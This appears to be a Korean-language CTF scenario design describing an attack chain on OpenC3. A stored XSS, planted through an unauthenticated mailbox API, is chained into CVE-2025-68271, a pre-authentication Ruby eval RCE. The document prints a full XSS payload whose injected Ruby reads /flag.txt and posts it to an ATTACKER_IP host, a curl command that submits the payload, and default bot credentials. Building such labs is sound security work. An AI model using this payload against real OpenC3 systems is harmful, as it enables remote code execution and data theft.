# CTF 시나리오: OpenC3 쪽지 XSS → CVE-2025-68271 RCE → Flag 탈취

## 전체 공격 체인

```
공격자가 공개 쪽지 제출 API로 악성 쪽지 등록 (POST /openc3-api/mailbox, 인증 없음)
  → OpenC3 쪽지 DB (Redis)
  → 관제사 봇 (ctf-operator-bot, Playwright)이 쪽지 클릭
  → XSS 페이로드 브라우저 실행
  → CVE-2025-68271: POST /openc3-api/api (pre-auth RCE)
  → Ruby 코드: File.read('/flag.txt') → HTTP 전송
  → 공격자 서버에 flag 수신
```

`POST /openc3-api/mailbox`는 관제사가 외부 클라이언트와 소통(문의 접수)하기 위해
의도적으로 인증 없이 열어둔 채널입니다. 공격자는 이 주소만 알면 되고,
관제 시스템 계정이나 이메일 계정 자격증명은 전혀 필요하지 않습니다.

## 서비스 구성

| 서비스 | 역할 |
|--------|------|
| `ctf-operator-bot` | Playwright 브라우저 봇 (쪽지 주기적 열람) |
| `/flag.txt` | OpenC3 cmd-tlm-api 컨테이너 내 flag 파일 |

## 환경변수 설정 (.env)

```env
CTF_BOT_USERNAME=operator
CTF_BOT_PASSWORD=operator
```

## 공격자 XSS 페이로드 예시

공격자는 아래 HTML을 body로 담아 공개 쪽지 API에 직접 등록합니다
(`ctf-services/send_xss.py` 참고):

```html
<img src="x" onerror="
(function(){
  var ruby = 'require(\'net/http\'); f=File.read(\'/flag.txt\'); Net::HTTP.post(URI(\'http://ATTACKER_IP:9999/\'), f); [1]';
  fetch('/openc3-api/api', {
    method: 'POST',
    headers: {'Content-Type': 'application/json-rpc'},
    body: JSON.stringify({
      jsonrpc: '2.0',
      method: 'cmd',
      params: ['INST ABORT with PARAM [' + ruby + ']'],
      keyword_params: {scope: 'DEFAULT'},
      id: 1
    })
  });
})();
">
```

```bash
curl -X POST http://TARGET_HOST:2900/openc3-api/mailbox \
  -H 'Content-Type: application/json' \
  -d '{"from_email":"attacker@example.com","subject":"긴급 공지","body":"<위 HTML>","scope":"DEFAULT"}'
```

## 왜 봇은 Python/curl이 아닌 Playwright여야 하는가?

- Python `requests` / `curl`은 JavaScript를 **실행하지 않음**
- 쪽지 본문의 XSS 페이로드는 **브라우저 JS 엔진**에서만 실행됨
- Playwright는 실제 Chromium을 구동하므로 `v-html`로 삽입된 악성 스크립트가 실행됨
- 봇 브라우저는 OpenC3에 인증된 세션을 가지고 있음 (쿠키/토큰)

## 취약점 요약

1. **Stored XSS**: 쪽지 `body` 필드를 HTML 그대로 `v-html`로 렌더링 (필터 없음)
2. **CVE-2025-68271**: `/openc3-api/api` JSON-RPC `cmd` 메서드에서
   `convert_to_value()`가 `[...]` 패턴 값을 `eval()`로 처리 →
   `authorize()` 호출 이전에 임의 Ruby 코드 실행
